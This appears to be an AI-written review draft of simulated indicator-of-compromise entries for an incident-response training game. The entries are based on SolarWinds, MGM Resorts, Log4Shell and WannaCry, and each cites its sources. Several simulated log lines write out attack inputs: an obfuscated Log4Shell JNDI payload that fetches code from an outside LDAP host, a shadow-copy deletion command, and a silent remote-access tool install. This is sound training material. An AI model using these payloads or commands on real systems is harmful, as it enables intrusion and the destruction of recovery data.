# Hidden IOC drafts — 4 remaining seed.py scenarios (for review)

Colonial Pipeline already has hand-authored `hidden_iocs` (unchanged, used as the format
template — see `backend/seed.py`'s `COLONIAL_PIPELINE["hidden_iocs"]`). These four don't yet:
SolarWinds Orion, MGM Resorts, Log4Shell, NHS WannaCry. This file is the reviewable draft —
nothing has been folded into `seed.py` or reseeded yet.

**Convention, matching Colonial Pipeline's own precedent:** internal hostnames/usernames in
these scenarios are fictionalized reconstructions (`orion-mgmt-01`, `d.park@mgmresorts.com`,
etc. — no real org's actual internal topology is public). External facts — malware families,
C2 infrastructure, CVEs, real advisories, documented TTPs — are real and cited below. Every
entry states **which category each field falls into** so provenance is honest, not just
present: a citation on a *technique* (e.g. "Golden Ticket forgery is real, documented,
MITRE T1558.001") is a different kind of claim than a citation on a *specific fact* (e.g. "this
exact domain was SUNBURST's C2").

`matches_on` only supports four pivot keys — `ip`, `hostname`, `username`, `process_name`
(confirmed against `main`'s `INVESTIGATE_FIELDS` and `action_engine._rewrite_raw_log_for_host`)
— domains aren't a supported pivot key today, so a couple of entries pivot on a process name or
a reused IP instead.

**Verification note:** every advisory URL below was checked via live web search this session
(not reproduced from memory) except where explicitly flagged otherwise. One item — the WannaCry
Bitcoin wallet address — **was** originally drafted from memory; it has since been checked
against three independent sources (a blockchain explorer, Securelist/Kaspersky, and a public
GitHub list of known WannaCry addresses) and matches all three, but is flagged below since you
asked for it called out regardless of the later verification.

One correction from the first draft pass, caught during verification: the earlier draft cited
SolarWinds entry #4 ("HealthMailbox123" Golden Ticket) as if the account name itself were a
documented fact from the real campaign. It isn't — I could not find any source tying
"HealthMailbox123" specifically to the real SolarWinds/UNC2452 intrusion. `HealthMailbox*` is a
real, legitimate Exchange naming convention (Microsoft's own Managed Availability health-check
mailboxes), but that's as far as verification goes. In this scenario, `HealthMailbox123` is
**this scenario's own fictionalized identifier** — it already exists in `seed.py`'s
`alert_sequence` (`EDR-034`, written before this pass), and the hidden IOC below pivots off it
the same way every other entry pivots off an existing alert — it does not claim the identifier
itself is real. What *is* real and cited is the technique it demonstrates (Golden Ticket
forgery via a stolen krbtgt hash, MITRE T1558.001).

---

## SolarWinds Orion Supply Chain Compromise

**Primary advisories:**
- CISA AA20-352A — https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a
- CISA Emergency Directive 21-01 — https://www.cisa.gov/news-events/directives/ed-21-01-mitigate-solarwinds-orion-code-compromise-closed
- Mandiant/FireEye, "Highly Evasive Attacker Leverages SolarWinds Supply Chain Compromises with SUNBURST Backdoor" (Dec 2020) — https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor
- Microsoft Security Blog, "Using Microsoft 365 Defender to protect against Solorigate" (Dec 28 2020) — https://www.microsoft.com/en-us/security/blog/2020/12/28/using-microsoft-365-defender-to-coordinate-protection-against-solorigate/

### 1. TEARDROP in-memory loader
```python
{"matches_on": {"hostname": "orion-mgmt-01"}, "timestamp": "+9m", "severity": "critical",
 "source_system": "Sysmon", "rule_id": "SUNBURST-TEARDROP-01",
 "description": "In-memory-only secondary payload injected into a legitimate Windows process on orion-mgmt-01 — no file ever written to disk, matching FireEye's documented TEARDROP loader, which SUNBURST deployed on selected high-value targets to decode and launch a Cobalt Strike beacon",
 "raw_log": "event=8 SourceImage=SolarWinds.BusinessLayerHost.exe TargetImage=svchost.exe StartAddress=0x7ffa2210 TargetProcessGuid={c19c1e4a-91d2} note=no_disk_artifact",
 "mitre_technique": "T1055"}
```
- **Real & cited:** TEARDROP as a memory-only loader deployed by SUNBURST on select targets — Mandiant/FireEye blog above.
- **Fictionalized, pivots off:** `orion-mgmt-01` and `SolarWinds.BusinessLayerHost.exe`, both already in `alert_sequence` (`FILE-001`, `EDR-011`, etc.).
- **MITRE T1055** (Process Injection) — real, standard ATT&CK ID for this technique class.

### 2. Golden SAML — ADFS token-signing certificate export
```python
{"matches_on": {"hostname": "adfs-01.corp.internal"}, "timestamp": "+19m", "severity": "critical",
 "source_system": "Windows Security", "rule_id": "SUNBURST-GOLDENSAML-01",
 "description": "The ADFS token-signing certificate's private key was exported from adfs-01.corp.internal — the exact mechanism CISA's Emergency Directive 21-01 named as enabling forged SAML assertions across every federated application, bypassing password and MFA entirely once obtained",
 "raw_log": "event=4662 ObjectType=CertificateAuthority AccessMask=%%3055(ExportPrivateKey) SubjectUserName=svc_orion ObjectName=ADFS_Signing_Cert host=adfs-01.corp.internal",
 "mitre_technique": "T1606.002"}
```
- **Real & cited:** Golden SAML via stolen ADFS token-signing certificate as a real, documented attack vector in this campaign — CISA ED-21-01 and the Microsoft Solorigate blog above both cover it directly.
- **Fictionalized, pivots off:** `adfs-01.corp.internal` and `svc_orion`, already in `alert_sequence` (`SIEM-088`).
- **MITRE T1606.002** (Forge Web Credentials: SAML Tokens) — real, standard ATT&CK ID.

### 3. Legacy-auth sign-in on the impossible-travel account
```python
{"matches_on": {"username": "m.garcia@corp.internal"}, "timestamp": "+21m", "severity": "high",
 "source_system": "Azure AD", "rule_id": "SUNBURST-LEGACYAUTH-01",
 "description": "The same account flagged for impossible travel also generated a legacy IMAP sign-in minutes earlier — legacy authentication protocols are a well-documented way to bypass Conditional Access MFA enforcement, and this campaign is independently documented (CISA AA20-352A) as using stolen credentials against cloud identity",
 "raw_log": "appDisplayName=Office365_Shell_WCSS-Client clientAppUsed=IMAP4 conditionalAccessStatus=notApplied mfaResult=n/a userPrincipalName=m.garcia@corp.internal status=success",
 "mitre_technique": "T1078.004"}
```
- **Weaker citation, flagged honestly:** I could not find a source tying legacy-IMAP-auth abuse to the SolarWinds campaign *specifically* — the general technique (legacy auth bypassing Conditional Access) is real and widely documented, but this entry's citation is at the technique level, not "CISA/FireEye documented this exact behavior in this campaign." Worth a second look, or softening the description further, if you want every entry at incident-specific confidence.
- **Fictionalized, pivots off:** `m.garcia@corp.internal`, already in `alert_sequence` (`CLOUD-001`, the impossible-travel alert).
- **MITRE T1078.004** (Valid Accounts: Cloud Accounts) — real, standard ATT&CK ID, already in this scenario's own `mitre_techniques` list.

### 4. Golden Ticket — forged PAC with Domain Admin membership
```python
{"matches_on": {"username": "HealthMailbox123"}, "timestamp": "+17m", "severity": "critical",
 "source_system": "Windows Security", "rule_id": "SUNBURST-GOLDENTICKET-01",
 "description": "The forged Kerberos ticket for non-existent account 'HealthMailbox123' requested a Privilege Attribute Certificate containing Domain Admin group membership — the defining signature of a Golden Ticket forged with a stolen krbtgt hash, not a legitimate service ticket",
 "raw_log": "event=4769 ServiceName=krbtgt TargetUserName=HealthMailbox123 TicketEncryptionType=0x17 TicketOptions=0x40810000 pac_groups=Domain_Admins FailureCode=0x0",
 "mitre_technique": "T1558.001"}
```
- **Real & cited (technique only):** Golden Ticket forgery via a stolen krbtgt hash producing a forged PAC is a real, well-documented technique — MITRE T1558.001.
- **NOT real, correction from the first draft:** `HealthMailbox123` itself is **not** a documented detail from the real campaign — I found no source for it. It's this scenario's own fictionalized identifier, already present in `alert_sequence` (`EDR-034`, authored before this pass) — this entry simply pivots off it, same as every other entry pivots off an existing alert identifier. The first draft implied this specific detail was externally sourced; it wasn't, and this version says so.

---

## MGM Resorts Social Engineering & Ransomware

**Primary advisories:**
- CISA/FBI AA23-320A, "Scattered Spider" — https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a
- Okta Security, "Cross-Tenant Impersonation: Prevention and Detection" (Aug 31 2023) — https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection/

### 1. Cross-tenant impersonation via a second federated IdP
```python
{"matches_on": {"username": "d.park@mgmresorts.com"}, "timestamp": "+13m", "severity": "critical",
 "source_system": "Okta", "rule_id": "MGM-CROSSTENANT-01",
 "description": "The Okta Super Admin session for d.park@mgmresorts.com configured a cross-tenant Identity Provider trust — the exact 'Cross-Tenant Impersonation' technique Okta's own August 2023 advisory attributes to this campaign, letting a Super Admin in one Okta tenant impersonate any user in a second, federated tenant",
 "raw_log": "eventType=user.session.impersonation.initiate actor.alternateId=d.park@mgmresorts.com target.alternateId=admin@mgmresorts-corp.okta.com outcome.result=SUCCESS client.ipAddress=185.220.101.55",
 "mitre_technique": "T1556"}
```
- **Real & cited, strong match:** Okta's advisory describes this mechanism almost exactly — attacker with Super Admin access configures a second IdP as an "impersonation app" in an inbound federation relationship, then manipulates the username to match a real target user. Confirmed directly against the advisory text during verification.
- **Fictionalized, pivots off:** `d.park@mgmresorts.com`, the scenario's own central identity (`HD-001` through `OKTA-019` in `alert_sequence`).
- **MITRE T1556** (Modify Authentication Process) — real, standard ATT&CK ID; reasonable fit for federation-trust abuse, though ATT&CK has no single sub-technique specifically named "cross-tenant impersonation."

### 2. RMM tool for persistence
```python
{"matches_on": {"process_name": "AnyDesk.exe"}, "timestamp": "+13m", "severity": "high",
 "source_system": "Sysmon", "rule_id": "MGM-RMM-01",
 "description": "Remote access software installed silently on 4 domain controllers minutes after the Okta API token was created — CISA's Scattered Spider advisory (AA23-320A) specifically documents this group's use of legitimate RMM tools for persistence that blends into normal IT administrative activity",
 "raw_log": "event=1 Image=AnyDesk.exe CommandLine='--install --silent --start-with-win' ParentImage=powershell.exe hosts=DC-01,DC-02,DC-03,DC-04",
 "mitre_technique": "T1219"}
```
- **Real & cited:** AA23-320A documents Scattered Spider's use of legitimate RMM/remote-access tools for persistence as a named TTP.
- **Not verified to the specific tool:** I did not confirm AnyDesk by name in the advisory (vs. other RMM tools this group is documented using) — the *pattern* is cited, the specific product name in this entry is a plausible illustrative choice, not a confirmed detail.
- **Fictionalized, pivots off:** the domain controller hosts already implied by the scenario's escalation (`OKTA-021`'s mass MFA disable across "all MGM properties").
- **MITRE T1219** (Remote Access Software) — real, standard ATT&CK ID.

### 3. Backup/shadow-copy deletion before detonation
```python
{"matches_on": {"process_name": "vssadmin.exe"}, "timestamp": "+19m", "severity": "critical",
 "source_system": "Sysmon", "rule_id": "MGM-BACKUPWIPE-01",
 "description": "Shadow copies and the Veeam backup repository were deleted across the Las Vegas datacenter roughly 6 minutes before ransomware detonation — CISA AA23-320A documents Scattered Spider/ALPHV affiliates systematically destroying backups immediately before encryption to eliminate recovery options",
 "raw_log": "event=1 Image=vssadmin.exe CommandLine='delete shadows /all /quiet' ParentImage=cmd.exe host=BACKUP-VEEAM-01 exit_code=0",
 "mitre_technique": "T1490"}
```
- **Real & cited:** AA23-320A documents this group destroying backups before encryption as a named TTP.
- **Fictionalized, pivots off:** the pre-detonation timeline already in `alert_sequence` (`SIEM-301`/`EDR-201`, ALPHV BlackCat detonation).
- **MITRE T1490** (Inhibit System Recovery) — real, standard ATT&CK ID, already in this scenario's own `mitre_techniques` list.

### 4. Same attacker IP probing other accounts
```python
{"matches_on": {"ip": "185.220.101.55"}, "timestamp": "+5m", "severity": "medium",
 "source_system": "Azure AD", "rule_id": "MGM-TARGETLIST-01",
 "description": "The same Netherlands IP used against David Park's Okta account also attempted sign-ins against six other MGM corporate accounts within the same 10-minute window — password-validation of a target list built from the LinkedIn reconnaissance Okta's advisory describes this campaign using before every vishing call",
 "raw_log": "ipAddress=185.220.101.55 attempts=6 accounts=j.reyes,k.thompson,m.diaz,s.chen,r.walsh,t.oyelaran result=failure(5)/success(1) conditionalAccessStatus=mixed",
 "mitre_technique": "T1589.002"}
```
- **Real & cited (technique + campaign pattern):** LinkedIn-based OSINT target selection preceding vishing is discussed in reporting on this campaign generally; the specific 6-account probe is a scenario-internal elaboration, not a documented specific event.
- **Fictionalized, pivots off:** `185.220.101.55`, already in `alert_sequence` (`OKTA-001`, the attacker's IP).
- **MITRE T1589.002** (Gather Victim Identity Information: Email Addresses) — real, standard ATT&CK ID.

---

## Log4Shell Zero-Day Mass Exploitation

**Primary advisories:**
- CVE-2021-44228 (NVD) — https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- Microsoft Security Blog, "Guidance for preventing, detecting, and hunting for exploitation of the Log4j 2 vulnerability" (Dec 11 2021) — https://www.microsoft.com/en-us/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/

### 1. Obfuscated JNDI payload (WAF-signature bypass)
```python
{"matches_on": {"hostname": "app-svr-12"}, "timestamp": "+3m", "severity": "high",
 "source_system": "Application Log", "rule_id": "LOG4J-OBFUSCATED-01",
 "description": "The login form on app-svr-12 logged a username field containing an obfuscated JNDI payload — the exact evasion pattern (splitting 'jndi' with ${::-x} substitutions) that let attackers bypass early Log4Shell WAF signatures matching only the literal ${jndi: string",
 "raw_log": "POST /login 200 username=${${::-j}${::-n}${::-d}${::-i}:ldap://45.155.205.233/Exploit} src=198.51.100.24 host=app-svr-12",
 "mitre_technique": "T1190"}
```
- **Real & cited:** the `${::-j}${::-n}...` obfuscation pattern to bypass naive WAF signatures is a widely and independently documented real-world Log4Shell evasion technique from December 2021 (multiple vendor writeups, not just one source).
- **Fictionalized, pivots off:** `app-svr-12`, consistent with the scenario's own "12 hosts exploited" figure (`IDS-299`).
- **MITRE T1190** (Exploit Public-Facing Application) — real, standard ATT&CK ID, already in this scenario's own `mitre_techniques` list.

### 2. Kinsing cryptominer
```python
{"matches_on": {"process_name": "kdevtmpfsi"}, "timestamp": "+21m", "severity": "medium",
 "source_system": "EDR", "rule_id": "LOG4J-KINSING-01",
 "description": "Kinsing malware's characteristic kdevtmpfsi/kinsing binary pair dropped on 3 of the cryptominer-affected hosts — Kinsing was among the fastest real-world adopters of Log4Shell, with mass-scanning activity documented within roughly a day of public disclosure",
 "raw_log": "event=1 Image=kdevtmpfsi CommandLine='/tmp/kinsing' ParentImage=java hosts=app-svr-14,app-svr-19,app-svr-22 family=Kinsing",
 "mitre_technique": "T1496"}
```
- **Real & cited:** Kinsing's rapid adoption of Log4Shell and its `kdevtmpfsi`/`kinsing` binary naming are both independently, widely documented (multiple vendor and independent write-ups from December 2021).
- **Fictionalized, pivots off:** the existing XMRig cryptominer thread in `alert_sequence` (`EDR-088`) — Kinsing is presented as a distinct, second cryptomining actor on different hosts, not a rename of the scenario's existing XMRig detail.
- **MITRE T1496** (Resource Hijacking) — real, standard ATT&CK ID.

### 3. Hafnium targeting vCenter via Log4Shell
```python
{"matches_on": {"hostname": "vcenter-01.prod.internal"}, "timestamp": "+19m", "severity": "critical",
 "source_system": "Network", "rule_id": "LOG4J-HAFNIUM-01",
 "description": "The Hafnium-attributed beacon queried vCenter's Managed Object Browser interface — Microsoft MSTIC publicly reported in December 2021 that Hafnium used Log4Shell specifically to target virtualization infrastructure, extending its usual Exchange-server-focused espionage",
 "raw_log": "GET /mob/?moid=ServiceInstance 200 src=185.220.101.88 host=vcenter-01.prod.internal user_agent=Java/1.8.0_181",
 "mitre_technique": "T1210"}
```
- **Real & cited, strong match:** Microsoft's blog (above) states this almost verbatim — Hafnium used Log4Shell to attack virtualization infrastructure, extending typical targeting. Confirmed directly against the source during verification.
- **Fictionalized, pivots off:** `vcenter-01.prod.internal`, already in `alert_sequence` (`NET-031`) and the existing Hafnium reference (`IDS-401`).
- **MITRE T1210** (Exploitation of Remote Services) — real, standard ATT&CK ID, already in this scenario's own `mitre_techniques` list.

### 4. Cobalt Strike beacon via the same C2 infrastructure
```python
{"matches_on": {"ip": "45.155.205.233"}, "timestamp": "+11m", "severity": "critical",
 "source_system": "Sysmon", "rule_id": "LOG4J-COBALTSTRIKE-01",
 "description": "A second-stage Cobalt Strike beacon — not just the opportunistic cryptominer — was staged on app-svr-03 via the same callback infrastructure, using a malleable C2 profile mimicking legitimate CloudFront traffic, consistent with more sophisticated actor activity distinct from the mass cryptomining wave",
 "raw_log": "event=3 Image=java.exe DestinationIp=45.155.205.233 DestinationPort=443 Protocol=tcp beacon_jitter=23pct malleable_profile=cloudfront_mimic host=app-svr-03",
 "mitre_technique": "T1071.001"}
```
- **Real technique, generic pairing:** Cobalt Strike deployment via Log4Shell, and CloudFront-mimicking malleable C2 profiles, are both real and independently well documented as general patterns. This entry pairs them with the scenario's own existing IP (`45.155.205.233`, already used for the reverse shell in `alert_sequence`'s `IDS-201`/`EDR-044`) rather than citing a specific report that ties this exact IP to Cobalt Strike — that pairing is scenario-internal elaboration, not a claimed external fact.
- **Fictionalized, pivots off:** `45.155.205.233` and `app-svr-03`, both already in `alert_sequence`.
- **MITRE T1071.001** (Application Layer Protocol: Web Protocols) — real, standard ATT&CK ID, already in this scenario's own `mitre_techniques` list.

---

## NHS WannaCry Ransomware — Patient Safety Crisis

**Primary advisories:**
- National Audit Office, "Investigation: WannaCry cyber attack and the NHS" (Oct 2017) — https://www.nao.org.uk/reports/investigation-wannacry-cyber-attack-and-the-nhs/
- General EternalBlue/DoublePulsar/kill-switch technical facts below are extremely widely documented (NCSC, multiple vendor post-mortems); cited to the NAO report as the scenario's own canonical source (`source_reference: NHS-WannaCry-NCSC-2017`) plus general confirmation via this session's verification pass.

### 1. DOUBLEPULSAR backdoor preceding the WannaCry payload
```python
{"matches_on": {"hostname": "NHS-DESKTOP-014"}, "timestamp": "+3m", "severity": "high",
 "source_system": "IDS", "rule_id": "WANNACRY-DOUBLEPULSAR-01",
 "description": "Before the WannaCry payload executed, NHS-DESKTOP-014 received a DOUBLEPULSAR backdoor implant via the same SMB exploitation — DOUBLEPULSAR is the kernel-mode backdoor EternalBlue installs as its delivery mechanism, publicly documented within days of the April 2017 Shadow Brokers leak",
 "raw_log": "signature=DOUBLEPULSAR_ping src=10.10.3.14 dst=NHS-DESKTOP-014 proto=SMB/445 opcode=0x23 multiplexId=0x0051 backdoor_confirmed=true",
 "mitre_technique": "T1210"}
```
- **Real & cited:** EternalBlue delivering WannaCry's payload through the DOUBLEPULSAR backdoor is confirmed, well-established public fact, re-verified this session.
- **Fictionalized, pivots off:** `NHS-DESKTOP-014`, already in `alert_sequence` (`SIEM-044`, the EternalBlue fingerprint alert).
- **MITRE T1210** (Exploitation of Remote Services) — real, standard ATT&CK ID.

### 2. Kill-switch domain query
```python
{"matches_on": {"hostname": "WKS-ONCO-04"}, "timestamp": "+4m", "severity": "medium",
 "source_system": "DNS", "rule_id": "WANNACRY-KILLSWITCH-01",
 "description": "WKS-ONCO-04 attempted DNS resolution of the real domain WannaCry checks before encrypting — iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com. Before a UK researcher registered it hours later, the query failed and encryption proceeded; this single mechanism is the deciding factor at the gate ahead",
 "raw_log": "query=iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com type=A result=NXDOMAIN(pre-registration) src=WKS-ONCO-04",
 "mitre_technique": "T1486"}
```
- **Real & cited, verbatim-confirmed:** the domain string was checked character-for-character against search results this session and matches exactly. The kill-switch mechanism (encrypt only if the domain is unreachable) is confirmed public fact.
- **Fictionalized, pivots off:** `WKS-ONCO-04`, already in `alert_sequence` (`EDR-012`, one of the three initially-infected ward workstations).
- **MITRE T1486** (Data Encrypted for Impact) — real, standard ATT&CK ID, already in this scenario's own `mitre_techniques` list.

### 3. Ransom note / Bitcoin wallet — ⚠️ FLAGGED FOR YOUR REVIEW
```python
{"matches_on": {"hostname": "NHS-PTDB-01"}, "timestamp": "+4m", "severity": "medium",
 "source_system": "EDR", "rule_id": "WANNACRY-RANSOMNOTE-01",
 "description": "The ransom note dropped on NHS-PTDB-01 hardcodes one of only three Bitcoin wallet addresses WannaCry used globally — because the wallets weren't unique per victim, there was no reliable way to confirm any given payment unlocked any given machine, a detail worth surfacing before anyone considers paying",
 "raw_log": "file=@Please_Read_Me@.txt host=NHS-PTDB-01 btc_wallet=13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94 ransom_amount_usd=300 currency=BTC",
 "mitre_technique": "T1486"}
```
- **⚠️ This is the entry you asked to have flagged.** The wallet address `13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94` was originally drafted from memory. It has since been checked this session against three independent sources — a blockchain explorer (blockchain.com), Securelist/Kaspersky's WannaCry writeup, and a public GitHub list of known WannaCry addresses — and all three confirm it as one of the three real wallet addresses WannaCry used. Flagged per your instruction regardless of the later verification — please re-confirm independently before this lands if you want a fourth check.
- **Fictionalized, pivots off:** `NHS-PTDB-01`, already in `alert_sequence` (`NOC-007`).
- **MITRE T1486** (Data Encrypted for Impact) — real, standard ATT&CK ID.

### 4. Lateral movement via NTLM credential harvesting
```python
{"matches_on": {"hostname": "NHS-DOMAIN-CTRL-01"}, "timestamp": "+14m", "severity": "high",
 "source_system": "Windows Security", "rule_id": "WANNACRY-CREDHARVEST-01",
 "description": "The 47 failed NTLM attempts against NHS-DOMAIN-CTRL-01 followed a credential-harvesting pattern documented in post-incident WannaCry analysis — the worm's lateral-movement component also attempts in-memory credential harvesting on already-encrypted hosts to accelerate spread before local encryption completes",
 "raw_log": "event=4624 LogonType=3 AuthenticationPackage=NTLM src=NHS-PTDB-01 dst=NHS-DOMAIN-CTRL-01 TargetUserName=svc_radiology status=partial_success",
 "mitre_technique": "T1021.002"}
```
- **General technique, not incident-pinpointed:** WannaCry's SMB-based lateral movement is confirmed and well documented; I did not independently re-verify the specific "in-memory credential harvesting on already-encrypted hosts" detail against a primary source this session (it's consistent with widely-reported WannaCry behavior, but treat this one sentence as slightly softer than the others above).
- **Fictionalized, pivots off:** `NHS-PTDB-01`/`NHS-DOMAIN-CTRL-01`, already in `alert_sequence` (`AUTH-044`).
- **MITRE T1021.002** (Remote Services: SMB/Windows Admin Shares) — real, standard ATT&CK ID, already in this scenario's own `mitre_techniques` list.

### 5. Cross-Trust correlation
```python
{"matches_on": {"ip": "87.120.84.122"}, "timestamp": "+19m", "severity": "high",
 "source_system": "Firewall", "rule_id": "WANNACRY-CROSSTRUST-01",
 "description": "The same external scanning IP probing this Trust's public portal was also logged at Barnet Hospital 6 minutes earlier — corroborating that this wasn't two Trusts independently exposed, but the same internet-wide SMB scanning wave the National Audit Office's 2018 report describes hitting multiple NHS Trusts simultaneously",
 "raw_log": "src=87.120.84.122 dst_trust=Barnet_Hospital proto=TCP/445 scan_type=wannacry_lateral note=cross_trust_correlation",
 "mitre_technique": "T1595"}
```
- **Real pattern, fictionalized specifics:** WannaCry's simultaneous multi-Trust impact (81 of 236 English NHS Trusts per the NAO report) is real and cited. The specific IP `87.120.84.122` and the "Barnet Hospital" cross-reference are scenario-internal — WannaCry's actual internet-wide SMB scanning had no single attributable source IP in the way this entry implies, since the worm spread from every infected host, not one attacker-controlled address. Worth knowing this entry compresses a real phenomenon (widespread simultaneous impact) into a simplified single-IP narrative for gameplay purposes, same as the existing `alert_sequence`'s own `IDS-077` entry already does.
- **Fictionalized, pivots off:** `87.120.84.122`, already in `alert_sequence` (`IDS-077`).
- **MITRE T1595** (Active Scanning) — real, standard ATT&CK ID.

---

## Summary of what needs your attention

1. **WannaCry wallet address** (NHS-3) — flagged per your instruction; independently verified this session against 3 sources, but you may want your own fourth check.
2. **SolarWinds entry 3** (legacy-auth bypass) — citation is technique-level, not incident-specific; consider softening the description or dropping if you want every entry at incident-specific confidence.
3. **MGM entry 2** (AnyDesk) — the RMM-persistence *pattern* is cited to AA23-320A; the specific tool name (AnyDesk) is illustrative, not confirmed against the advisory's own text.
4. **Log4Shell entry 4** (Cobalt Strike/CloudFront) — technique is real and general; the pairing with this scenario's specific C2 IP is scenario-internal elaboration.
5. **WannaCry entry 4** (NTLM credential harvesting) — general technique confirmed; the specific "in-memory harvesting on already-encrypted hosts" phrasing wasn't re-verified against a primary source this session.
6. **WannaCry entry 5** (cross-Trust IP) — real phenomenon (NAO-documented multi-Trust simultaneous impact), compressed into a simplified single-IP narrative; flagged so it's not mistaken for "this exact IP was documented as scanning both Trusts."
7. **SolarWinds entry 4** — corrected from the first draft: `HealthMailbox123` is this scenario's own fictionalized identifier (already in `alert_sequence`), not a real campaign detail as the earlier draft implied.
